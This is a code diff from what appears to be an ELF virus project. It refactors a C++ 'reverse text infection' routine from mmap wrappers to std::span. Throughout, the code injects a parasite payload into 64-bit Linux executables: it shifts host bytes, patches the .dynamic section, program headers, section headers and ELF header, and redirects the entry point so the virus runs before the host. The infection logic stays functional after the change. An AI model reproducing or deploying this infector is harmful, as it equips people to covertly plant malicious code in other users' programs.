@@ -138,8 +138,8 @@ bool does_entry_contain_address(Elf64_Xword tag) {
 // patched accordingly. This function searches through all entries in .dynamic
 // section and shift those pointers forward if they have a smaller vaddr than
 // the firs byte of CODE (where we insert the virus).
-bool patch_dyamic(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
-                  const Elf64_Ehdr& ehdr, const Elf64_Shdr& shdr,
+bool patch_dyamic(std::span<std::byte> host_mapping, const Elf64_Ehdr& ehdr,
+                  const Elf64_Shdr& shdr,
                   Elf64_Off original_code_segment_file_offset,
                   Elf64_Addr original_code_segment_p_vaddr,
                   uint64_t padded_virus_size) {
@@ -153,8 +153,8 @@ bool patch_dyamic(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
   for (auto cur_entry = section_entry_start;
        cur_entry < section_entry_start + ehdr.e_shnum; ++cur_entry) {
     if (cur_entry->sh_type == SHT_DYNAMIC) {
-      auto* dynamic_section_entry = reinterpret_cast<Elf64_Dyn*>(
-          host_mapping.mutable_base() + cur_entry->sh_offset);
+      auto* dynamic_section_entry =
+          reinterpret_cast<Elf64_Dyn*>(&host_mapping[cur_entry->sh_offset]);
       // look at all entries in .dynamic section until the last DT_NULL is
       // reached. If the entry is an address and is smaller than CODE start, we
       // have shifted it forward. Adjust values here.
@@ -174,8 +174,8 @@ bool patch_dyamic(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
   return false;
 }
 
-size_t inject_virus(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
-                    const vt::common::Mmap<PROT_READ>& parasite_mapping,
+size_t inject_virus(std::span<std::byte> host_mapping,
+                    std::span<const std::byte> parasite_mapping,
                     const Elf64_Ehdr& ehdr, uint64_t padded_virus_size,
                     Elf64_Off original_code_segment_file_offset) {
   Elf64_Addr virus_insert_offset = original_code_segment_file_offset;
@@ -185,49 +185,47 @@ size_t inject_virus(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
   }
 
   // Shift old content back.
-  vt::memcpy(
-      host_mapping.mutable_base() + virus_insert_offset + padded_virus_size,
-      host_mapping.mutable_base() + virus_insert_offset,
-      host_mapping.size() - padded_virus_size - virus_insert_offset);
+  vt::memcpy(&host_mapping[virus_insert_offset + padded_virus_size],
+             &host_mapping[virus_insert_offset],
+             host_mapping.size() - padded_virus_size - virus_insert_offset);
   // Clear old content. Not required.
-  vt::memset(host_mapping.mutable_base() + virus_insert_offset, 0x00,
-             padded_virus_size);
+  vt::memset(&host_mapping[virus_insert_offset], 0x00, padded_virus_size);
 
   // Inject the virus.
-  vt::memcpy(host_mapping.mutable_base() + virus_insert_offset,
-             parasite_mapping.base(), parasite_mapping.size());
+  vt::memcpy(&host_mapping[virus_insert_offset], parasite_mapping.data(),
+             parasite_mapping.size());
 
   return virus_insert_offset;
 }
 
 }  // namespace
 
-bool ReverseTextInfect::inject(
-    vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
-    vt::common::Mmap<PROT_READ> parasite_mapping) {
-  const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
+bool ReverseTextInfect::inject(std::span<std::byte> host_mapping,
+                               std::span<const std::byte> parasite_mapping) {
+  const auto& ehdr =
+      *reinterpret_cast<const Elf64_Ehdr*>(&host_mapping.front());
 
   auto padded_virus_size = round_up_to_page(parasite_mapping.size());
 
   {
-    const auto& shdr = *reinterpret_cast<const Elf64_Shdr*>(
-        host_mapping.mutable_base() + ehdr.e_shoff);
+    const auto& shdr =
+        *reinterpret_cast<const Elf64_Shdr*>(&host_mapping[ehdr.e_shoff]);
     // Patch .dynamic section if we touched .gnu.hash
     patch_dyamic(host_mapping, ehdr, shdr, original_code_segment_file_offset_,
                  original_code_segment_p_vaddr_, padded_virus_size);
   }
 
   {
-    auto& mutable_phdr = *reinterpret_cast<Elf64_Phdr*>(
-        host_mapping.mutable_base() + ehdr.e_phoff);
+    auto& mutable_phdr =
+        *reinterpret_cast<Elf64_Phdr*>(&host_mapping[ehdr.e_phoff]);
     patch_phdr(ehdr, mutable_phdr, padded_virus_size,
                original_code_segment_file_offset_,
                original_code_segment_p_vaddr_, code_segment_idx_);
   }
 
   {
-    auto& mutable_shdr = *reinterpret_cast<Elf64_Shdr*>(
-        host_mapping.mutable_base() + ehdr.e_shoff);
+    auto& mutable_shdr =
+        *reinterpret_cast<Elf64_Shdr*>(&host_mapping[ehdr.e_shoff]);
     patch_sht(ehdr, mutable_shdr, padded_virus_size,
               original_code_segment_file_offset_,
               original_code_segment_p_vaddr_);
@@ -235,8 +233,7 @@ bool ReverseTextInfect::inject(
 
   {
     // Patch elf header last
-    auto& mutable_ehdr =
-        *reinterpret_cast<Elf64_Ehdr*>(host_mapping.mutable_base());
+    auto& mutable_ehdr = *reinterpret_cast<Elf64_Ehdr*>(&host_mapping.front());
     patch_ehdr(mutable_ehdr, original_code_segment_p_vaddr_,
                original_code_segment_file_offset_, padded_virus_size);
   }
@@ -246,18 +243,18 @@ bool ReverseTextInfect::inject(
                    original_code_segment_file_offset_);
 
   // Patch parasite to resume host code after execution.
-  return redirect_elf_entry_point(ehdr.e_type, original_e_entry_, ehdr.e_entry,
-                                  virus_offset, parasite_mapping.size(),
-                                  host_mapping);
+  return common::redirect_elf_entry_point(
+      ehdr.e_type, original_e_entry_, ehdr.e_entry, virus_offset,
+      parasite_mapping.size(), host_mapping);
 }
 
-bool ReverseTextInfect::analyze(
-    const common::Mmap<PROT_READ>& host_mapping,
-    const common::Mmap<PROT_READ>& parasite_mapping) {
+bool ReverseTextInfect::analyze(std::span<const std::byte> host_mapping,
+                                std::span<const std::byte> parasite_mapping) {
   host_size_ = host_mapping.size();
   parasite_size_ = parasite_mapping.size();
 
-  const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
+  const auto& ehdr =
+      *reinterpret_cast<const Elf64_Ehdr*>(&host_mapping.front());
 
   if ((ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
       ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
@@ -265,7 +262,7 @@ bool ReverseTextInfect::analyze(
   }
 
   const auto& phdr =
-      *reinterpret_cast<const Elf64_Phdr*>(host_mapping.base() + ehdr.e_phoff);
+      *reinterpret_cast<const Elf64_Phdr*>(&host_mapping[ehdr.e_phoff]);
 
   original_e_entry_ = ehdr.e_entry;
   // Point to first entry in PHT
